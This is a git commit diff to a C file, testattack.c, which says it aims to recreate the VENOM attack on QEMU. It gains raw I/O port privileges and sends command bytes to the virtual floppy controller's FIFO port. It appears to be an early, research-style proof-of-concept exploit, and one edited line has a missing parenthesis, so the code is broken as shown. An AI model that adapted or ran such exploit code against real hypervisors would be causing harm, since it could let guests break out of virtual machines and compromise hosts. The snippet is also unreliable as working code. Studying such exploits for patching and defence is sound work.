58c6af3e97bae32c18025db1a8cf63019a298bb8
yihao <yzhng127@illinois.edu>
2015-06-16 14:34:21 -0500

    test read write switch

--- testattack.c
+++ testattack.c
@@ -9,17 +9,22 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define MAX_COUNT 1 
 #define TEST_VAL  0x12
 #define FD_CMD_READ 0x06
+#define WRITE 0x05
+
 int main(void){
         iopl(3);
         ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
         outb(SPC_COMMAND, FIFO);
-        int i,j;
-        j = 0;
-        printf("into loop\n");
-        for(i=0; i<MAX_COUNT; i++ ){
-                outb(TEST_VAL,0x3f5);
-        }
+        // int i,j;
+        // j = 0;
+        // printf("into loop\n");
+        // for(i=0; i<MAX_COUNT; i++ ){
+        //         outb(TEST_VAL,0x3f5);
+        // }
+        outb(TEST_VAL, FIFO);
+        outb(WRITE, FIFO);
+        outb(TEST_VAL, FIFO;
         outb(FD_CMD_READ, FIFO);
         printf("try read: %d\n", inb(0x3f5));
 }
